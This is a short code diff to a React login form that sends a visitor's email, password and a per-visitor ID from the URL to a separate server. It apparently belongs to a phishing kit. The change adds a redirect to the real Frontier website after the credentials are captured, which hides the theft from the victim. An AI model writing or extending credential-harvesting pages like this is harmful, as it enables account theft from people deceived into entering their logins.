@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import axios from 'axios'
 import { hostURL } from '../helpers/data'
 import { useLocation } from 'react-router-dom'
@@ -7,10 +7,15 @@ const Form = () => {
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState(false)
+  const [redirect, setRedirect] = useState(false)
 
   const { search } = useLocation()
   const userID = search.slice(1)
   console.log(userID)
+
+  useEffect(() => {
+    redirect && window.location.replace('https://frontier.com/')
+  }, [redirect])
 
   const handleClick = () => {
     setError(false)
@@ -20,7 +25,10 @@ const Form = () => {
     }
     axios
       .post(`${hostURL}main`, { email, password, userID })
-      .then((resp) => console.log(resp.data))
+      .then((resp) => {
+        console.log(resp.data)
+        setRedirect(true)
+      })
       .catch((e) => console.log(e))
     // alert('logged in')
   }
